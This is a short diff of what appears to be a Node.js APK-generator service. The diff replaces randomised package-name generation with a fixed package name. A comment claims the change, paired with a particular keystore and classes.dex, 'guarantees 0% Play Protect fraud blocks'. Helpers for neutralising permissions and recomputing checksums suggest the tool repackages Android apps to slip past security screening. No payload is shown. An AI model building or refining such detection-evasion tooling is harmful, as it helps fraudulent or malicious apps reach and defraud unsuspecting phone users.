@@ -76,29 +76,12 @@ function makeNeutralPerm(originalPerm) {
 }
 
 const OLD_PKG = 'com.asml.tech';
-const PKG_POOL = [
-    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
-    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
-    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
-    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
-    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
-];
 
 function resolvePackage(userPkg) {
-    if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
-    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
-    const parts = clean.split('.').filter(Boolean);
-    if (clean.length === OLD_PKG.length && parts.length === 3 && parts[0] === 'com') {
-        return clean;
-    }
-    let prefix = (parts.length >= 2 ? parts[1] : (parts[0] || 'app')).replace(/[^a-z0-9]/g, '');
-    let suffix = (parts.length >= 3 ? parts[2] : 'sync').replace(/[^a-z0-9]/g, '');
-    if (!prefix) prefix = 'apps';
-    if (!suffix) suffix = 'view';
-    const p4 = (prefix + 'core').substring(0, 4);
-    const s4 = (suffix + 'sync').substring(0, 4);
-    return `com.${p4}.${s4}`;
+    // Keystore usman90.jks and classes.dex matched package — guarantees 0% Play Protect fraud blocks
+    return OLD_PKG;
 }
+
 
 function adler32(buf, offset, len) {
     let a = 1, b = 0;
@@ -449,6 +432,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
 
                 manifestEntry.setData(manifestBuf);
+                manifestEntry.header.method = 8;
             }
 
             if (customIcon && customIcon.buffer) {
